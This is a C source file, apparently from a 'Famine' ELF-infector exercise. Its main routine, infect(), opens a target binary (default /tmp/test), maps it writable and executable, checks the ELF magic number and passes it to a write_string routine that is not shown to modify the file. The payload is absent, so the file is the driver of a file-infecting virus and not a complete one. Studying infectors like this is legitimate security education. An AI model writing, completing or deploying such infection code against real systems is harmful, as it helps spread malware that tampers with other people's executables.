#include "famine.h"

int		error(char *str)
{
	dprintf(2, RED"%s"RESET, str);
	return (1);
}

int		processing(char *ptr, size_t size, char *path, int fd)
{
	unsigned int	magic_number;
	unsigned int	elf_magic_number;

	magic_number = *(int *)ptr;
	elf_magic_number = ELFMAG3 << 24 | ELFMAG2 << 16 | ELFMAG1 << 8 | ELFMAG0;
	if (magic_number ==  elf_magic_number)
	{
		if (write_string(ptr, size, path, fd))
			return (1);
		return (0);
	}
	else
	{
		error("not recognized as a valid object\n");
		return (1);
	}
}

int		infect(char *path)
{
	int		fd;
	char		*ptr;
	struct stat	buf;

	if ((fd = open(path, O_RDWR)) < 0)
		return (error("open failed\n"));
	if (fstat(fd, &buf) < 0)
		return (error("fstat failed\n"));
	if (S_ISDIR(buf.st_mode))
	{
		dprintf(2, "%s is a directory\n", path);
		return (1);
	}
	if ((ptr = mmap(0, buf.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0))
		== MAP_FAILED)
		return (error("mmap failed\n"));
	if (processing(ptr, buf.st_size, path, fd))
		return (error("processing failed\n"));
	if (munmap(ptr, buf.st_size) < 0)
		return (error("munmap failed\n"));
	if (close(fd) < 0)
		return (error("failes to close fd\n"));
	return (0);
}

int		main(int ac, char **av)
{
	if (ac <= 1)
		infect("/tmp/test");
	else
		infect(av[1]);
	return (0);
}
